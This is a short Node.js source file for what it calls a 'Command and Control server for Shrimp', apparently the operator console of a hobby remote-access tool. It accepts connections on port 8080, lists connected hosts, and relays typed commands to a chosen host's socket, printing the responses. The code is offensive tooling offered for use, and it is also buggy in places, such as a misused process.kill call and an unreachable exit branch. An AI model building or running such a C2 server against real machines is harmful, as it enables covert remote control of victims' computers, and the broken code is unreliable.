const net = require('net');
const readline = require('readline');

let clients = {};
let currentId;

const server = net.createServer((socket) => {
 const id = Math.random().toString(36).substring(7);
 clients[id] = {socketObject: socket, hostname: socket.remoteAddress};
 console.log('client');

socket.on('data', (data) => {
  console.log(data);
  const parsedData = JSON.parse(data);
  if (parsedData['type'] == 'response') {
    console.log(parsedData['data']);
  }
});

 socket.on('end', () => {
 delete clients[id];
 console.log(`Client ${id} disconnected`);
 });
});

server.listen(8080, () =>
	{
});

function exit() {
  process.kill("Shutting down shrimp server.");
}

function promptUser(question) {
 return new Promise((resolve) => {
   const rl = readline.createInterface({
     input: process.stdin,
     output: process.stdout
   });

   rl.question(question, (answer) => {
     rl.close();
     resolve(answer);
   });
 });
}

async function main() {
 while (true) {
   console.log("Command and Control server for Shrimp started.");
   let input = await promptUser("shrimp! >>");
   switch (input.split(" ")[0]) {
     case "set":
       console.log("set detected with" + input.split(" ")[1]);
       const id = input.split(" ")[1];
       currentId = id;
       while (true){
         const promptForId = await promptUser(clients[currentId].hostname+'$');
         console.log(promptForId);
         clients[currentId].socketObject.write(promptForId);
       }
       break;

     case "list":
       console.log(clients);
       break;

     case null:
       exit();
       break;
   }
 }
}

main();

